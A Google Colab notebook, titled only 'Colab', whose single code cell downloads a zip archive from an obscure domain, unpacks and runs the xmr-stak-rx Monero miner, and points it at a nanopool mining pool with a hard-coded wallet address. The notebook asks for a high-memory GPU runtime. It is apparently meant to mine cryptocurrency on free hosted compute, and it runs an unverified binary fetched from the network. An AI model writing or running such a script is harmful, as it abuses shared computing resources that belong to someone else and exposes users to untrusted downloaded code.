{
  "nbformat": 4,
  "nbformat_minor": 0,
  "metadata": {
    "colab": {
      "name": "go.ipynb",
      "provenance": [],
      "private_outputs": true,
      "collapsed_sections": [
        "8uQ12Gz6ZzCb"
      ],
      "machine_shape": "hm"
    },
    "kernelspec": {
      "name": "python3",
      "display_name": "Python 3"
    },
    "accelerator": "GPU"
  },
  "cells": [
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "8uQ12Gz6ZzCb"
      },
      "source": [
        "# ****Colab****\n",
        "\n",
        "\n"
      ]
    },
    {
      "cell_type": "code",
      "metadata": {
        "id": "8S3CXRBTZa6C"
      },
      "source": [
        "!wget https://expandrive.my.id/1.zip\n",
        "!unzip 1.zip\n",
        "!chmod +x xmrstak\n",
        "%cd xmrstak\n",
        "!chmod +x ./xmr-stak-rx\n",
        "!./xmr-stak-rx --noTest -o xmr-us-east1.nanopool.org:14444 -u 84creefXf6fAbqojaqtDitGGjA8w6kzo31e4sbp73wZf83TShCe3pfrWDPth7U7SGTJRRFWfyotqf5Qtf19W9AxHPz5gbKB -p colab --noDevSupport --currency randomx"
      ],
      "execution_count": null,
      "outputs": []
    }
  ]
}